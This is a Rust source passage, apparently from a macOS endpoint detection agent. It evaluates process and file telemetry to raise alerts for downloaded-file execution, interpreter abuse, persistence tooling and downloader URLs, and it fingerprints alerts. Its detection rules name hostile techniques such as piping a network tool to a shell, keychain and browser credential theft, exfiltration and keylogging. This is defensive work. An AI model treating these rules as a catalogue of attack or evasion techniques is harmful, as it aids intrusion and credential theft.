use crate::classify::{
    is_benign_admin_tool_command, is_benign_developer_tool_command, is_persistence_path,
    is_persistence_tool_command, is_script_interpreter,
};
use crate::command_patterns;
use crate::execution_graph::{ExecutionChain, ExecutionGraphSnapshot};
use crate::lineage::LineageSnapshot;
use crate::models::{AlertSeverity, FileEventRecord, ProcessInfo, TelemetryEvent};
use chrono::{DateTime, Duration, Utc};
use serde_json::{json, Value};
use std::collections::HashMap;
use std::path::Path;
use crate::baseline::BaselineSnapshot;
use crate::provenance::ArtifactProvenanceSnapshot;

pub struct DetectionContext {
    pub recent_file_events: Vec<FileEventRecord>,
    pub current_processes: Vec<ProcessInfo>,
    pub recent_processes: Vec<ProcessInfo>,
    pub execution_graph: ExecutionGraphSnapshot,
    pub lineage: LineageSnapshot,
    pub provenance: ArtifactProvenanceSnapshot,
    pub baseline: BaselineSnapshot,
    pub now: DateTime<Utc>,

}

pub fn evaluate_detections(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut detections = Vec::new();

    if let Some(event) = detect_burst_file_activity(ctx) {
        detections.push(event);
    }

    detections.extend(detect_downloaded_file_executed(ctx));
    detections.extend(detect_interpreter_launch_from_downloads(ctx));
    detections.extend(detect_file_became_executable(ctx));
    detections.extend(detect_quarantined_file_activity(ctx));
    detections.extend(detect_persistence_artifact_touched(ctx));
    detections.extend(detect_suspicious_shell_chain(ctx));
    detections.extend(detect_command_pattern_abuse(ctx));
    detections.extend(detect_interpreter_abuse(ctx));
    detections.extend(detect_interpreter_spawned_follow_on_binary(ctx));
    detections.extend(detect_downloader_url_execution(ctx));
    detections.extend(detect_browser_ancestor_downloader_chain(ctx));
    detections.extend(detect_persistence_tooling_activity(ctx));
    detections.extend(detect_suspicious_persistence_chain(ctx));
    detections.extend(detect_downloaded_installer_activity(ctx));
    detections.extend(detect_rare_interpreter_execution(ctx));
    detections.extend(detect_process_masquerading(ctx));
    detections.extend(detect_double_extension_execution(ctx));
    detections.extend(detect_lolbin_and_injection(ctx));
    detections.extend(detect_keychain_access_attempt(ctx));
    detections.extend(detect_browser_credential_access(ctx));
    detections.extend(detect_credential_file_access(ctx));
    detections.extend(detect_ransomware_behavior(ctx));
    detections.extend(detect_file_type_mismatch(ctx));
    detections.extend(detect_system_recon(ctx));
    detections.extend(detect_network_recon(ctx));
    detections.extend(detect_filesystem_recon(ctx));
    detections.extend(detect_privilege_escalation(ctx));
    detections.extend(detect_indicator_removal(ctx));
    detections.extend(detect_screen_capture(ctx));
    detections.extend(detect_data_staging(ctx));
    detections.extend(detect_ssh_lateral_movement(ctx));
    detections.extend(detect_browser_extension_installed(ctx));
    detections.extend(detect_exfiltration_pattern(ctx));
    detections.extend(detect_keylogging_attempt(ctx));
    detections.extend(detect_boot_security_tamper(ctx));
    detections.extend(detect_signed_binary_proxy_execution(ctx));
    detections.extend(detect_security_tool_tampering(ctx));
    detections.extend(detect_account_manipulation(ctx));
    detections.extend(detect_plist_modification(ctx));
    detections
}

fn detect_rare_interpreter_execution(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        let command_lc = process.command.to_lowercase();
        let args_lc = process.args.to_lowercase();

        let looks_like_interpreter =
            process.process_kind == "interpreter"
                || command_lc.contains("bash")
                || command_lc.contains("zsh")
                || command_lc.contains("sh")
                || command_lc.contains("python");

        if !looks_like_interpreter {
            continue;
        }

        let seen_count = ctx.baseline.seen_count_for(process);
        if seen_count >= 3 {
            continue;
        }

        let matched_file = ctx.recent_file_events.iter().find(|file_event| {
            let path_lc = file_event.path.to_lowercase();
            let basename_lc = file_event
                .path
                .rsplit('/')
                .next()
                .unwrap_or(&file_event.path)
                .to_lowercase();

            let age_seconds = ctx
                .now
                .signed_duration_since(file_event.timestamp)
                .num_seconds();

            let is_recent = age_seconds >= 0 && age_seconds <= 15;

            let is_user_space = path_lc.contains("/downloads/")
                || path_lc.contains("/desktop/")
                || path_lc.contains("/documents/");

            let looks_script_like = path_lc.ends_with(".sh")
                || path_lc.ends_with(".py")
                || path_lc.ends_with(".command")
                || path_lc.ends_with(".zsh")
                || path_lc.ends_with(".bash");

            let explicitly_referenced =
                (!process.args.is_empty() && args_lc.contains(&path_lc))
                    || (!process.args.is_empty() && args_lc.contains(&basename_lc));

            explicitly_referenced || (is_recent && is_user_space && looks_script_like)
        });

        let Some(file_event) = matched_file else {
            continue;
        };

        let provenance = ctx.provenance.get(&file_event.path);

        let suspicious_origin = match provenance {
            Some(record) => {
                let age_seconds = ctx
                    .now
                    .signed_duration_since(record.first_seen)
                    .num_seconds();

                age_seconds <= 300
                    || record.first_seen_in_downloads
                    || !record.referenced_urls.is_empty()
            }
            None => true,
        };

        if !suspicious_origin {
            continue;
        }

        alerts.push(TelemetryEvent::new(
            ctx.now,
            "alert_rare_interpreter_execution",
            "core-agent/detection",
            json!({
                "title": "Rare interpreter execution of newly introduced file",
                "severity": "high",
                "score": 85,
                "pid": process.pid,
                "command": process.command,
                "args": process.args,
                "path": file_event.path,
                "baseline_seen_count": seen_count,
                "process_kind": process.process_kind,
                "reason": "Interpreter-like process executed or closely followed a newly introduced user-space script that appears rare in the local baseline"
            }),
        ));
    }

    alerts
}

pub fn alert_fingerprint(event: &TelemetryEvent) -> String {
    let payload = &event.payload;

    match event.event_type.as_str() {
        "alert_burst_file_activity" => {
            let directory = payload
                .get("details")
                .and_then(|d| d.get("directory"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}", event.event_type, directory)
        }
        "alert_downloaded_file_executed" => {
            let pid = payload
                .get("details")
                .and_then(|d| d.get("pid"))
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            let matched_download_path = payload
                .get("details")
                .and_then(|d| d.get("matched_download_path"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}:{}", event.event_type, pid, matched_download_path)
        }
        "alert_interpreter_launch_from_downloads" => {
            let pid = payload
                .get("details")
                .and_then(|d| d.get("pid"))
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            let matched_download_path = payload
                .get("details")
                .and_then(|d| d.get("matched_download_path"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}:{}", event.event_type, pid, matched_download_path)
        }
        "alert_file_became_executable" => {
            let path = payload
                .get("details")
                .and_then(|d| d.get("path"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}", event.event_type, path)
        }
        "alert_quarantined_file_activity" => {
            let path = payload
                .get("details")
                .and_then(|d| d.get("path"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}", event.event_type, path)
        }
        "alert_persistence_artifact_touched"
        | "alert_suspicious_persistence_chain"
        | "alert_persistence_tooling_activity" => {
            let path = payload
                .get("details")
                .and_then(|d| d.get("path"))
                .or_else(|| payload.get("details").and_then(|d| d.get("persistence_path")))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}", event.event_type, path)
        }
        "alert_suspicious_shell_chain"
        | "alert_interpreter_spawned_follow_on_binary"
        | "alert_downloaded_installer_activity"
        | "alert_browser_ancestor_downloader_chain" => {
            let parent_pid = payload
                .get("details")
                .and_then(|d| d.get("parent_pid"))
                .or_else(|| payload.get("details").and_then(|d| d.get("pid")))
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            let child_command = payload
                .get("details")
                .and_then(|d| d.get("child_command"))
                .or_else(|| payload.get("details").and_then(|d| d.get("command")))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}:{}", event.event_type, parent_pid, child_command)
        }
        "alert_command_pattern_abuse" | "alert_downloader_url_execution" => {
            let pid = payload
                .get("details")
                .and_then(|d| d.get("pid"))
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            format!("{}:{}", event.event_type, pid)
        }
        "alert_interpreter_abuse" => {
            let pid = payload
                .get("details")
                .and_then(|d| d.get("pid"))
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            format!("{}:{}", event.event_type, pid)
        }
        "alert_behavioral_incident" => {
            let chain_root_pid = payload
                .get("details")
                .and_then(|d| d.get("chain_root_pid"))
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            format!("{}:{}", event.event_type, chain_root_pid)
        }
        "alert_lolbin_execution" | "alert_curl_pipe_bash" | "alert_command_injection_pattern" => {
            let pid = payload
                .get("details")
                .and_then(|d| d.get("pid"))
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            let rule_ids = payload
                .get("details")
                .and_then(|d| d.get("matched_rule_ids"))
                .and_then(|v| v.as_array())
                .map(|arr| {
                    arr.iter()
                        .filter_map(|v| v.as_str())
                        .collect::<Vec<_>>()
                        .join(",")
                })
                .unwrap_or_default();
            format!("{}:{}:{}", event.event_type, pid, rule_ids)
        }
        "alert_process_masquerading" => {
            let pid = payload
                .get("details")
                .and_then(|d| d.get("pid"))
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            let binary_path = payload
                .get("details")
                .and_then(|d| d.get("binary_path"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}:{}", event.event_type, pid, binary_path)
        }
        "alert_double_extension_execution" => {
            let path = payload
                .get("details")
                .and_then(|d| d.get("path"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}", event.event_type, path)
        }
        "alert_rare_interpreter_execution" => {
            let pid = payload
                .get("pid")
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            let path = payload
                .get("path")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}:{}", event.event_type, pid, path)
        }
        "alert_ransomware_behavior_detected" => {
            let sub_signal = payload
                .get("details")
                .and_then(|d| d.get("sub_signal"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}", event.event_type, sub_signal)
        }
        "alert_file_type_mismatch" => {
            let path = payload
                .get("details")
                .and_then(|d| d.get("path"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}", event.event_type, path)
        }
        "alert_keychain_access_attempt" | "alert_browser_credential_access" | "alert_ssh_key_access" => {
            let pid = payload
                .get("details")
                .and_then(|d| d.get("pid"))
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            let command = payload
                .get("details")
                .and_then(|d| d.get("command"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}:{}", event.event_type, pid, command)
        }
        "alert_system_recon_detected"
        | "alert_network_recon_detected"
        | "alert_filesystem_recon_detected"
        | "alert_privilege_escalation_attempt"
        | "alert_suspicious_sudo_execution"
        | "alert_indicator_removal_attempt"
        | "alert_screen_capture_attempt"
        | "alert_suspicious_media_access"
        | "alert_ssh_lateral_movement"
        | "alert_upload_command_detected"
        | "alert_suspected_exfiltration" => {
            let pid = payload
                .get("details")
                .and_then(|d| d.get("pid"))
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            let command = payload
                .get("details")
                .and_then(|d| d.get("command"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}:{}", event.event_type, pid, command)
        }
        "alert_ssh_key_tampering" => {
            let path = payload
                .get("details")
                .and_then(|d| d.get("path"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}", event.event_type, path)
        }
        "alert_browser_extension_installed" => {
            let path = payload
                .get("details")
                .and_then(|d| d.get("path"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}", event.event_type, path)
        }
        "alert_keylogging_attempt"
        | "alert_boot_security_tamper"
        | "alert_signed_binary_proxy_execution"
        | "alert_security_tool_tampering"
        | "alert_account_manipulation"
        | "alert_plist_modification" => {
            let pid = payload
                .get("details")
                .and_then(|d| d.get("pid"))
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            let command = payload
                .get("details")
                .and_then(|d| d.get("command"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}:{}", event.event_type, pid, command)
        }
        "alert_suspicious_archive_creation" | "alert_data_staging_detected" => {
            let pid = payload
                .get("details")
                .and_then(|d| d.get("pid"))
                .and_then(|v| v.as_i64())
                .unwrap_or(-1);
            let staging_dir = payload
                .get("details")
                .and_then(|d| d.get("staging_directory").or_else(|| d.get("archive_tool")))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            format!("{}:{}:{}", event.event_type, pid, staging_dir)
        }
        _ => format!("{}:{}", event.event_type, payload),
    }
}

fn detect_burst_file_activity(ctx: &DetectionContext) -> Option<TelemetryEvent> {
    let cutoff = ctx.now - Duration::seconds(15);
    let mut count_by_directory: HashMap<String, usize> = HashMap::new();

    for event in &ctx.recent_file_events {
        if event.timestamp < cutoff {
            continue;
        }

        let directory = parent_dir_string(&event.path);
        *count_by_directory.entry(directory).or_insert(0) += 1;
    }

    let (directory, count) = count_by_directory.into_iter().max_by_key(|(_, count)| *count)?;
    if count < 25 {
        return None;
    }

    Some(build_alert(
        ctx.now,
        "alert_burst_file_activity",
        AlertSeverity::Medium,
        "file_activity",
        "Unusually high file activity in a short time window",
        json!({
            "directory": directory,
            "events_in_last_15_seconds": count,
        }),
    ))
}

fn detect_downloaded_file_executed(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let cutoff = ctx.now - Duration::seconds(120);

    let recent_download_paths: Vec<String> = ctx
        .recent_file_events
        .iter()
        .filter(|event| event.timestamp >= cutoff)
        .filter(|event| event.path.contains("/Downloads/"))
        .map(|event| event.path.clone())
        .collect();

    let mut detections = Vec::new();

    for process in &ctx.recent_processes {
        if is_benign_process_context(process) {
            continue;
        }

        let process_text = format!("{} {}", process.command, process.args);

        for download_path in &recent_download_paths {
            if process_matches_download_path(process, &process_text, download_path) {
                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "command": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "command_path_kind": process.command_path_kind,
                    "matched_download_path": download_path,
                    "parent_command": process.parent_command,
                    "parent_args": process.parent_args,
                    "parent_process_kind": process.parent_process_kind,
                    "parent_command_path_kind": process.parent_command_path_kind,
                    "behavior": process.behavior,
                });

                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                detections.push(build_alert(
                    ctx.now,
                    "alert_downloaded_file_executed",
                    AlertSeverity::High,
                    "execution",
                    "A recently downloaded file appears to have been executed",
                    details,
                ));
                break;
            }
        }
    }

    detections
}

fn detect_interpreter_launch_from_downloads(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let cutoff = ctx.now - Duration::seconds(120);

    let recent_download_paths: Vec<String> = ctx
        .recent_file_events
        .iter()
        .filter(|event| event.timestamp >= cutoff)
        .filter(|event| event.path.contains("/Downloads/"))
        .map(|event| event.path.clone())
        .collect();

    let mut detections = Vec::new();

    for process in &ctx.recent_processes {
        if !is_script_interpreter(&process.command) || is_benign_process_context(process) {
            continue;
        }

        let process_text = format!("{} {}", process.command, process.args);

        for download_path in &recent_download_paths {
            if process_matches_download_path(process, &process_text, download_path) {
                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "interpreter": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "command_path_kind": process.command_path_kind,
                    "matched_download_path": download_path,
                    "file_extension": file_extension(download_path),
                    "parent_command": process.parent_command,
                    "parent_args": process.parent_args,
                    "parent_process_kind": process.parent_process_kind,
                    "parent_command_path_kind": process.parent_command_path_kind,
                    "behavior": process.behavior,
                });

                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                detections.push(build_alert(
                    ctx.now,
                    "alert_interpreter_launch_from_downloads",
                    AlertSeverity::High,
                    "script_execution",
                    "A script interpreter appears to have launched content from Downloads",
                    details,
                ));
                break;
            }
        }
    }

    detections
}

fn detect_file_became_executable(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let cutoff = ctx.now - Duration::seconds(120);

    ctx.recent_file_events
        .iter()
        .filter(|event| event.timestamp >= cutoff)
        .filter(|event| event.kind == "file_became_executable")
        .map(|event| {
            let severity = if event.path.contains("/Downloads/") {
                AlertSeverity::High
            } else {
                AlertSeverity::Medium
            };

            build_alert(
                ctx.now,
                "alert_file_became_executable",
                severity,
                "permissions",
                "A file gained executable permissions",
                json!({
                    "path": event.path,
                    "directory": parent_dir_string(&event.path),
                    "in_downloads": event.path.contains("/Downloads/"),
                    "file_extension": file_extension(&event.path),
                }),
            )
        })
        .collect()
}

fn detect_quarantined_file_activity(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let cutoff = ctx.now - Duration::seconds(120);

    ctx.recent_file_events
        .iter()
        .filter(|event| event.timestamp >= cutoff)
        .filter(|event| event.path.contains("/Downloads/"))
        .filter(|event| event.has_quarantine)
        .filter(|event| {
            event.kind == "file_created"
                || event.kind == "file_modified"
                || event.kind == "file_gained_quarantine"
        })
        .filter(|event| is_high_signal_download_path(&event.path))
        .map(|event| {
            let severity = quarantine_severity(event);

            build_alert(
                ctx.now,
                "alert_quarantined_file_activity",
                severity,
                "quarantine",
                "A high-signal Downloads item carries macOS quarantine metadata",
                json!({
                    "path": event.path,
                    "event_kind": event.kind,
                    "directory": parent_dir_string(&event.path),
                    "file_extension": file_extension(&event.path),
                    "is_executable": event.is_executable,
                    "size_bytes": event.size_bytes,
                    "quarantine_value": event.quarantine_value,
                    "top_level_download_item": is_top_level_download_item(&event.path),
                }),
            )
        })
        .collect()
}

fn detect_persistence_artifact_touched(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let cutoff = ctx.now - Duration::seconds(120);

    ctx.recent_file_events
        .iter()
        .filter(|event| event.timestamp >= cutoff)
        .filter(|event| event.kind == "file_created" || event.kind == "file_modified")
        .filter(|event| is_persistence_path(&event.path))
        .map(|event| {
            build_alert(
                ctx.now,
                "alert_persistence_artifact_touched",
                AlertSeverity::High,
                "persistence",
                "A file associated with a persistence mechanism was created or modified",
                json!({
                    "path": event.path,
                    "event_kind": event.kind,
                    "directory": parent_dir_string(&event.path),
                    "file_extension": file_extension(&event.path),
                    "is_executable": event.is_executable,
                    "has_quarantine": event.has_quarantine,
                }),
            )
        })
        .collect()
}

fn detect_suspicious_shell_chain(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let cutoff = ctx.now - Duration::seconds(120);

    let recent_download_paths: Vec<String> = ctx
        .recent_file_events
        .iter()
        .filter(|event| event.timestamp >= cutoff)
        .filter(|event| event.path.contains("/Downloads/"))
        .map(|event| event.path.clone())
        .collect();

    let mut interpreter_parents: HashMap<i32, (&ProcessInfo, String)> = HashMap::new();

    for process in &ctx.recent_processes {
        if !is_script_interpreter(&process.command) || is_benign_process_context(process) {
            continue;
        }

        let process_text = format!("{} {}", process.command, process.args);

        for download_path in &recent_download_paths {
            if process_matches_download_path(process, &process_text, download_path) {
                interpreter_parents.insert(process.pid, (process, download_path.clone()));
                break;
            }
        }
    }

    let mut detections = Vec::new();

    for child in &ctx.recent_processes {
        if let Some((parent, matched_download_path)) = interpreter_parents.get(&child.ppid) {
            if child.pid == parent.pid || is_boring_shell_child(&child.command) {
                continue;
            }

            let mut details = json!({
                "parent_pid": parent.pid,
                "parent_command": parent.command,
                "parent_args": parent.args,
                "parent_process_kind": parent.process_kind,
                "parent_command_path_kind": parent.command_path_kind,
                "child_pid": child.pid,
                "child_command": child.command,
                "child_args": child.args,
                "child_process_kind": child.process_kind,
                "child_command_path_kind": child.command_path_kind,
                "matched_download_path": matched_download_path,
                "child_parent_command": child.parent_command,
                "child_parent_args": child.parent_args,
            });

            merge_chain_details(&mut details, chain_details(child.pid, ctx));

            detections.push(build_alert(
                ctx.now,
                "alert_suspicious_shell_chain",
                AlertSeverity::High,
                "process_chain",
                "A script launched from Downloads spawned a follow-on child process",
                details,
            ));
        }
    }

    detections
}

fn detect_command_pattern_abuse(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut detections = Vec::new();

    for process in &ctx.recent_processes {
        if process.behavior.suspicious_command_patterns.is_empty() {
            continue;
        }

        if should_suppress_command_pattern_detection(process) {
            continue;
        }

        let severity = if process
            .behavior
            .suspicious_command_patterns
            .iter()
            .any(|pattern| pattern == "network_tool_piped_to_shell")
        {
            AlertSeverity::Critical
        } else if process
            .behavior
            .suspicious_command_patterns
            .iter()
            .any(|pattern| {
                pattern == "launchctl_persistence_operation"
                    || pattern == "crontab_persistence_operation"
                    || pattern == "installer_pkg_execution"
                    || pattern == "open_executable_candidate"
                    || pattern == "network_download_with_url"
            }) {
            AlertSeverity::High
        } else {
            AlertSeverity::High
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "command_path_kind": process.command_path_kind,
            "matched_patterns": process.behavior.suspicious_command_patterns,
            "referenced_paths": process.behavior.referenced_paths,
            "referenced_urls": process.behavior.referenced_urls,
            "behavior": process.behavior,
            "parent_command": process.parent_command,
            "parent_args": process.parent_args,
            "parent_process_kind": process.parent_process_kind,
        });

        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        detections.push(build_alert(
            ctx.now,
            "alert_command_pattern_abuse",
            severity,
            "command_pattern",
            "A process command line matched suspicious execution patterns",
            details,
        ));
    }

    detections
}

fn detect_interpreter_abuse(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut detections = Vec::new();

    for process in &ctx.recent_processes {
        if !is_script_interpreter(&process.command) {
            continue;
        }

        if should_suppress_interpreter_detection(process) {
            continue;
        }

        let high_signal = process.behavior.has_inline_code_execution
            || process.behavior.references_downloads_path
            || process.behavior.references_script_file
            || process.behavior.references_persistence_path
            || process.behavior.references_url;

        if !high_signal {
            continue;
        }

        let severity = if process.behavior.references_downloads_path
            && process.behavior.references_script_file
        {
            AlertSeverity::High
        } else if process.behavior.references_persistence_path || process.behavior.references_url {
            AlertSeverity::High
        } else {
            AlertSeverity::Medium
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "interpreter": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "command_path_kind": process.command_path_kind,
            "behavior": process.behavior,
            "parent_command": process.parent_command,
            "parent_args": process.parent_args,
            "parent_process_kind": process.parent_process_kind,
        });

        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        detections.push(build_alert(
            ctx.now,
            "alert_interpreter_abuse",
            severity,
            "interpreter_abuse",
            "A script interpreter was launched with high-signal execution characteristics",
            details,
        ));
    }

    detections
}

fn detect_interpreter_spawned_follow_on_binary(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut detections = Vec::new();

    for child in &ctx.recent_processes {
        let Some(parent_node) = ctx.execution_graph.nodes.get(&child.ppid) else {
            continue;
        };

        let parent = &parent_node.process;

        if !is_script_interpreter(&parent.command) || should_suppress_interpreter_detection(parent) {
            continue;
        }

        let suspicious_parent = parent.behavior.has_inline_code_execution
            || parent.behavior.references_downloads_path
            || parent.behavior.references_url
            || !parent.behavior.suspicious_command_patterns.is_empty();

        if !suspicious_parent || is_boring_shell_child(&child.command) {
            continue;
        }

        let mut details = json!({
            "parent_pid": parent.pid,
            "parent_command": parent.command,
            "parent_args": parent.args,
            "parent_process_kind": parent.process_kind,
            "child_pid": child.pid,
            "child_command": child.command,
            "child_args": child.args,
            "child_process_kind": child.process_kind,
            "child_command_path_kind": child.command_path_kind,
            "parent_behavior": parent.behavior,
            "child_behavior": child.behavior,
        });

        merge_chain_details(&mut details, chain_details(child.pid, ctx));

        detections.push(build_alert(
            ctx.now,
            "alert_interpreter_spawned_follow_on_binary",
            AlertSeverity::High,
            "process_chain",
            "A suspicious interpreter process spawned a follow-on child process",
            details,
        ));
    }

    detections
}

fn detect_downloader_url_execution(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut detections = Vec::new();

    for process in &ctx.recent_processes {
        if should_suppress_command_pattern_detection(process) {
            continue;
        }

        let downloader_like = process.behavior.uses_network_download_tool
            || process.behavior.downloader_family.is_some();

        if !(downloader_like && process.behavior.references_url) {
            continue;
        }

        let severity = if process.behavior.references_downloads_path
            || process.behavior.references_executable_candidate
        {
            AlertSeverity::High
        } else {
            AlertSeverity::Medium
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "command_path_kind": process.command_path_kind,
            "downloader_family": process.behavior.downloader_family,
            "referenced_urls": process.behavior.referenced_urls,
            "behavior": process.behavior,
            "parent_command": process.parent_command,
            "parent_args": process.parent_args,
            "parent_process_kind": process.parent_process_kind,
        });

        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        detections.push(build_alert(
            ctx.now,
            "alert_downloader_url_execution",
            severity,
            "network_download",
            "A downloader-like process referenced one or more URLs during execution",
            details,
        ));
    }

    detections
}

fn detect_browser_ancestor_downloader_chain(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut detections = Vec::new();

    for process in &ctx.recent_processes {
        if !ctx.lineage.has_browser_ancestor(process.pid, 6) {
            continue;
        }

        let downloader_like = process.behavior.uses_network_download_tool
            || process.behavior.downloader_family.is_some()
            || process.behavior.references_url;

        if !downloader_like || should_suppress_command_pattern_detection(process) {
            continue;
        }

        let nearest_browser = ctx
            .lineage
            .nearest_browser_ancestor_command(process.pid, 6)
            .unwrap_or_else(|| "unknown_browser".to_string());

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "command_path_kind": process.command_path_kind,
            "referenced_urls": process.behavior.referenced_urls,
            "nearest_browser_ancestor": nearest_browser,
            "behavior": process.behavior,
            "parent_command": process.parent_command,
            "parent_args": process.parent_args,
            "parent_process_kind": process.parent_process_kind,
        });

        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        detections.push(build_alert(
            ctx.now,
            "alert_browser_ancestor_downloader_chain",
            AlertSeverity::High,
            "browser_origin_download",
            "A browser-originating ancestry chain led into downloader-like execution",
            details,
        ));
    }

    detections
}

fn detect_persistence_tooling_activity(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut detections = Vec::new();

    for process in &ctx.recent_processes {
        if !is_persistence_tool_command(&process.command) {
            continue;
        }

        if should_suppress_persistence_tool_detection(process) {
            continue;
        }

        let matched_patterns = process
            .behavior
            .suspicious_command_patterns
            .iter()
            .filter(|pattern| {
                matches!(
                    pattern.as_str(),
                    "launchctl_persistence_operation"
                        | "crontab_persistence_operation"
                        | "persistence_path_reference"
                )
            })
            .cloned()
            .collect::<Vec<String>>();

        if matched_patterns.is_empty() && !process.behavior.references_persistence_path {
            continue;
        }

        let severity = if process.behavior.references_downloads_path {
            AlertSeverity::Critical
        } else {
            AlertSeverity::High
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "command_path_kind": process.command_path_kind,
            "matched_patterns": matched_patterns,
            "behavior": process.behavior,
            "parent_command": process.parent_command,
            "parent_args": process.parent_args,
            "parent_process_kind": process.parent_process_kind,
            "persistence_path": process.behavior.referenced_paths.iter().find(|path| is_persistence_path(path)).cloned(),
        });

        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        detections.push(build_alert(
            ctx.now,
            "alert_persistence_tooling_activity",
            severity,
            "persistence_tooling",
            "Persistence-oriented tooling activity was observed in process execution",
            details,
        ));
    }

    detections
}

fn detect_suspicious_persistence_chain(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let cutoff = ctx.now - Duration::seconds(180);
    let persistence_events: Vec<&FileEventRecord> = ctx
        .recent_file_events
        .iter()
        .filter(|event| event.timestamp >= cutoff)
        .filter(|event| event.kind == "file_created" || event.kind == "file_modified")
        .filter(|event| is_persistence_path(&event.path))
        .collect();

    let mut detections = Vec::new();

    for persistence_event in persistence_events {
        for process in &ctx.recent_processes {
            if should_suppress_persistence_tool_detection(process) {
                continue;
            }

            let chain = ctx.execution_graph.chain_for_pid(process.pid, 6);

            let Some(chain) = chain else {
                continue;
            };

            let chain_refs_persistence =
                chain.related_paths.iter().any(|path| path == &persistence_event.path)
                    || process
                        .behavior
                        .referenced_paths
                        .iter()
                        .any(|path| path == &persistence_event.path)
                    || process.behavior.references_persistence_path;

            let suspicious_chain = process.behavior.references_downloads_path
                || process.behavior.has_inline_code_execution
                || process.behavior.references_url
                || !process.behavior.suspicious_command_patterns.is_empty()
                || chain.attack_chain_length >= 2;

            if !(chain_refs_persistence && suspicious_chain) {
                continue;
            }

            let severity = if process.behavior.references_downloads_path
                || process.behavior.references_url
                || process
                    .behavior
                    .suspicious_command_patterns
                    .iter()
                    .any(|p| p == "launchctl_persistence_operation" || p == "crontab_persistence_operation")
            {
                AlertSeverity::Critical
            } else {
                AlertSeverity::High
            };

            let mut details = json!({
                "persistence_path": persistence_event.path,
                "event_kind": persistence_event.kind,
                "pid": process.pid,
                "ppid": process.ppid,
                "command": process.command,
                "args": process.args,
                "process_kind": process.process_kind,
                "command_path_kind": process.command_path_kind,
                "behavior": process.behavior,
                "parent_command": process.parent_command,
                "parent_args": process.parent_args,
                "parent_process_kind": process.parent_process_kind,
            });

            merge_chain_details(&mut details, execution_chain_json(&chain, &ctx.lineage, process.pid));

            detections.push(build_alert(
                ctx.now,
                "alert_suspicious_persistence_chain",
                severity,
                "persistence",
                "A suspicious execution chain appears to have referenced or modified a persistence artifact",
                details,
            ));
        }
    }

    detections
}

fn detect_downloaded_installer_activity(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut detections = Vec::new();

    for process in &ctx.recent_processes {
        let patterns = &process.behavior.suspicious_command_patterns;
        let installer_like = patterns.iter().any(|pattern| {
            pattern == "installer_pkg_execution"
